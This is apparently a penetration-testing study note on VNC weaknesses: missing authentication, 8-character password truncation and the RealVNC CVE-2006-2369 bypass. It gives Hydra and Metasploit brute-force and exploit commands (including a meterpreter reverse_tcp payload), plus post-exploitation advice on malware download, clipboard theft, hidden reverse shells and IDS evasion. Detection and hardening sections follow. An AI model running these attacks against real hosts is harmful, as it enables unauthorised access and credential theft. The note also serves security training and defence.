---
tags: [vnc, enumeration, brute-force, gui, rfb, unauthenticated]
difficulty: intermediate
module: "35 - Network Protocol Attacks"
topic: "35.29 VNC"
---

# VNC — No Authentication, Weak Password

## 1. Executive Summary
Virtual Network Computing (VNC) is a robust and historically significant graphical desktop-sharing system. It utilizes the Remote Frame Buffer (RFB) protocol to remotely control another computer system. VNC fundamentally works by capturing keyboard and mouse input on the local system (client) and transmitting it to the remote system (server), while simultaneously relaying the graphical screen updates back over the network. 

Because of its simplicity, VNC has been widely integrated into various administrative tools, hypervisors (like VMware and QEMU), IoT devices, and Industrial Control Systems (ICS). However, this widespread adoption is often accompanied by severe security misconfigurations. The most critical vulnerabilities surrounding VNC deployments are the lack of mandatory authentication, the reliance on weak 8-character passwords, and legacy authentication bypass flaws. By exploiting these weaknesses, an attacker can achieve immediate, unauthenticated, interactive graphical access to a remote host, leading to complete system compromise.

## 2. Technical Architecture: The RFB Protocol
The Remote Frame Buffer (RFB) protocol operates on a client-server architecture.
- **VNC Server:** The system being controlled. It captures the local display framebuffer and listens for incoming connections, typically on TCP port `5900 + N` (where N is the display number). A display of `:0` corresponds to port `5900`, `:1` corresponds to `5901`, and so on.
- **VNC Client:** The system initiating the control. It renders the received framebuffer updates and transmits hardware input events.

### 2.1 RFB Protocol Handshake Sequence
The RFB protocol begins with a strict handshake to negotiate protocol versions and security types:
1. **ProtocolVersion:** Both client and server exchange their supported RFB version (e.g., `RFB 003.008\n`).
2. **SecurityTypes:** The server sends a list of supported security types. Common types include:
   - `1`: None (No authentication required)
   - `2`: VNC Authentication (Standard 8-character password via DES)
   - `16`: TightVNC Authentication
   - `18`: TLS
3. **SecuritySelection:** The client selects one of the security types offered by the server.
4. **SecurityResult:** If authentication succeeds (or if `None` was selected), the server sends a success message.
5. **ClientInit:** The client sends an initialization message, specifying if it wants to share the desktop with other connected clients.
6. **ServerInit:** The server responds with the framebuffer dimensions, pixel format, and desktop name.

## 3. ASCII Architecture Diagram: RFB Unauthenticated Flow

```text
+-----------------------+                                  +-----------------------+
|      VNC Client       |                                  |      VNC Server       |
|    (Attacker IP)      |                                  |      (Target IP)      |
+-----------------------+                                  +-----------------------+
            |                                                          |
            | ------------ 1. ProtocolVersion (RFB 003.008) ---------> |
            | <----------- 2. ProtocolVersion (RFB 003.008) ---------- |
            |                                                          |
            | <----------- 3. SecurityTypes (0x01: None) ------------- |
            |                                                          |
            | ------------ 4. SecuritySelection (0x01: None) --------> |
            |                                                          |
            | <----------- 5. SecurityResult (0x00000000: OK) -------- |
            |                                                          |
            | ------------ 6. ClientInit (Shared=1) -----------------> |
            |                                                          |
            | <----------- 7. ServerInit (Width, Height, Name) ------- |
            |                                                          |
            | ============ 8. Graphical Framebuffer Updates =========> |
            | <=========== 9. Keystrokes & Mouse Events ============== |
            |                                                          |
```

## 4. Attack Vectors and Vulnerabilities
### 4.1 Unauthenticated Access (SecurityType 1)
In many internal networks, administrators intentionally disable VNC authentication to facilitate quick remote assistance. Additionally, many IoT and ICS devices ship with VNC enabled by default with no authentication. If an attacker routes to the exposed port, they immediately gain full control of the desktop.

### 4.2 Weak Passwords and DES Truncation (SecurityType 2)
The standard VNC authentication mechanism uses a challenge-response system. The server sends a 16-byte random challenge, and the client encrypts it using standard Data Encryption Standard (DES) using the user's password as the key.
**Critical Flaw:** The standard VNC implementation only uses the first 8 characters of the password. If a user sets a password of `SuperSecret123`, VNC silently truncates it to `SuperSec`. This low entropy drastically reduces the time required for brute-force attacks.

### 4.3 RealVNC Authentication Bypass (CVE-2006-2369)
In legacy versions of RealVNC (4.1.0 and 4.1.1), a catastrophic logic flaw existed. The server allowed the client to dictate the authentication type, rather than enforcing its own configuration. An attacker could forcefully send `SecurityType 1` (None), and the vulnerable server would accept it, completely bypassing the required password check.

## 5. Enumeration Methodology
### 5.1 Nmap Scanning
Nmap is the primary tool for identifying VNC servers and their supported authentication methods.
```bash
# Broad scan for common VNC ports
nmap -p 5900-5905 -sV <target-ip>

# Detailed NSE script enumeration
nmap -p 5900 --script vnc-info,vnc-title,realvnc-auth-bypass <target-ip>
```
**Example Nmap Output:**
```text
PORT     STATE SERVICE VERSION
5900/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     None (1)  <-- CRITICAL: Unauthenticated access is allowed
|_  WARNING: VNC server allows unauthenticated access!
```

### 5.2 Metasploit Framework Enumeration
Metasploit offers excellent auxiliary modules for mass-scanning networks for exposed VNC instances.
```bash
msfconsole -q
msf6 > use auxiliary/scanner/vnc/vnc_none_auth
msf6 > set RHOSTS 10.0.0.0/24
msf6 > set THREADS 50
msf6 > run
```

## 6. Exploitation Techniques
### 6.1 Connecting to Unauthenticated Instances
If `None (1)` is supported, exploitation is trivial. Use any standard VNC client to connect.
```bash
vncviewer 10.10.10.50:5900
remmina -c vnc://10.10.10.50:5900
```
Once connected, the attacker has interactive GUI access.

### 6.2 Brute-Forcing Weak Passwords
Due to the 8-character truncation, brute-forcing VNC is highly effective. Ensure your wordlist is optimized (e.g., dropping words longer than 8 characters to save time).
**Using Hydra:**
```bash
hydra -s 5900 -P /usr/share/wordlists/rockyou.txt -t 16 10.10.10.50 vnc
```
**Using Metasploit:**
```bash
msf6 > use auxiliary/scanner/vnc/vnc_login
msf6 > set RHOSTS 10.10.10.50
msf6 > set PASS_FILE /usr/share/wordlists/rockyou.txt
msf6 > set STOP_ON_SUCCESS true
msf6 > run
```

### 6.3 Exploiting CVE-2006-2369
To exploit the RealVNC bypass, Metasploit provides a dedicated exploit module.
```bash
msf6 > use exploit/windows/vnc/realvnc_client
msf6 > set RHOST 10.10.10.50
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set LHOST tun0
msf6 > run
```
*Note: Alternatively, modified versions of `vncviewer` can be compiled to send the modified handshake manually.*

## 7. Post-Exploitation & Lateral Movement
Upon gaining VNC access, the attacker operates within the context of the user running the VNC service. On Windows, third-party VNC servers often run as system services (`NT AUTHORITY\SYSTEM`). On Linux, `x11vnc` or `TigerVNC` might run as `root` or a standard user.
- **Command Execution:** Open `cmd.exe` or `bash` to execute standard post-exploitation commands.
- **File Transfer:** While some VNC clients support file transfers, it is often easier to open a web browser on the target and download malware via HTTP, or use `certutil.exe` / `Invoke-WebRequest`.
- **Clipboard Theft:** VNC synchronizes the clipboard by default. An attacker can monitor the clipboard to steal passwords copied from a password manager by the legitimate user.
- **Reverse Shells:** To stabilize access (since VNC sessions can be visually detected by the user if the mouse moves automatically), immediately establish a hidden reverse shell.

## 8. Defensive Evasion
Because VNC is unencrypted, network defenders can easily capture keystrokes and screen buffers. Advanced attackers often tunnel VNC traffic through encrypted channels (like SSH) to evade IDS/IPS signatures and prevent packet capture analysis.
```bash
# Local port forwarding VNC over SSH
ssh -L 5901:127.0.0.1:5900 user@10.10.10.50
# Connect to the local forwarded port
vncviewer 127.0.0.1:5901
```

## 9. Incident Response & Detection
### 9.1 Network Traffic Analysis
Since standard VNC traffic is unencrypted, incident responders can use Wireshark to reconstruct the session.
- **Filter:** `vnc`
- Look for the initial `RFB` handshake packets.
- Identify the selected SecurityType. If `0x01` is selected, an unauthenticated session was established.
- If SecurityType `0x02` is used, the challenge and response can be extracted and cracked offline using tools like `vnccrack` to recover the compromised password.

### 9.2 Splunk / SIEM Queries
Monitor endpoint logs for the execution of VNC server binaries or unexpected listening ports.
```spl
index=sysmon EventCode=3 DestinationPort=5900 OR DestinationPort=5901
| stats count by SourceIp, DestinationIp, Image
| where count > 100 
```

## 10. Remediation & Hardening Guide
- **Enforce Strong Authentication:** Never deploy VNC with "No Authentication". Utilize modern VNC implementations that support MS-Logon (Active Directory integration) or robust authentication plugins.
- **Implement Network Segmentation:** Do not expose VNC ports (TCP 5900+) directly to the internet or untrusted internal VLANs. Place VNC servers behind a VPN or a Zero Trust Network Access (ZTNA) gateway.
- **Enforce Encryption:** Native VNC lacks encryption. Mandate the use of TLS-enabled VNC servers or tunnel all VNC traffic through SSH or IPsec.
- **Update VNC Software:** Ensure all VNC server binaries are up to date to eliminate legacy vulnerabilities like CVE-2006-2369 and various memory corruption flaws.
- **Monitor the Clipboard:** Configure the VNC server to disable clipboard synchronization if it is not strictly required by the administrative workflow.

## 11. Chaining Opportunities
- **[[08 - Network Pivoting and Tunneling]]:** A compromised VNC server serves as an excellent jump box. Attackers can upload Chisel or Ligolo-ng via the GUI to pivot deeper into the network.
- **[[14 - Credential Dumping]]:** Using the interactive GUI, attackers can easily open an administrative terminal and execute Mimikatz or dump the SAM hive.
- **[[17 - Keylogging and Spyware]]:** VNC itself acts as a keylogger if the attacker passively watches the session without moving the mouse.

## 12. Related Notes
- [[04 - RDP Security]]
- [[12 - Default Credentials and Passwords]]
- [[30 - X11 — Exposed Display Server]]
